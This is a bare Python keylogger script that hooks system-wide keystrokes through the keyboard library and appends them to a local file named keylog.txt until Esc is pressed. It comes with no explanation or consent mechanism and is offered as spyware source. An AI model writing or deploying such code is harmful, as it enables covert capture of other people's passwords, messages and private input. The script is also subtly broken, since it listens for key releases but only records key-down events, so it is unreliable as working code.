import keyboard

def keylogger():
    log_file = open("keylog.txt", "a")  # Open file in append mode
    
    def on_key_event(event):
        if event.event_type == keyboard.EVENT_KEY_DOWN:
            key = event.name
            if len(key) == 1:  # Normal character
                log_file.write(key)
            elif key == "space":
                log_file.write(" ")
            elif key == "enter":
                log_file.write("\n")
            elif key == "backspace":
                # Handle backspace by removing last character in file
                log_file.seek(0, 2)  # Move to end of file
                size = log_file.tell()
                log_file.truncate(size - 1)  # Remove last character
            else:
                log_file.write("[" + key + "]")  # Special key

    keyboard.on_release(on_key_event)
    keyboard.wait('esc')  # Program will run until Esc key is pressed
    log_file.close()

if __name__ == "__main__":
    keylogger()
